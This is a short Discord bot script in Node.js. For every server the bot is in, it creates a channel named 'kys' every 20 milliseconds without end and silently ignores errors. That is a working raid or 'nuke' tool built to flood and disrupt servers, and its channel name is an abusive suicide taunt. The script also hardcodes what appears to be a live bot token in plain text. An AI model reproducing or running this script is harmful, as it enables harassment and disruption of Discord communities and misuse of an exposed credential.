const { Client, GatewayIntentBits, Events, PermissionsBitField, Partials } = require('discord.js')
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildPresences ], partials: [Partials.GuildMember], })

client.on(Events.ClientReady, async (c) => {  
    c.guilds.cache.forEach(async guild => {
         console.log("Getting ready...")
            setInterval(async () => {
                try {
                    let channel = await guild.channels.create({
                        name: `kys`,
                        reason: `hsafhamsfhpnsfphjadjh`,
                   }).then(c => console.log("Created "+c.name))
                } catch {}
            }, 20);
    })
  })
  client.login("MTA1NjI2NjAwNzc4Nzg3NjQ0Mg.GUpjlC.NZPcKdKVG1YQHKZhg0aiiGUjKgRw4LVnq_sHho")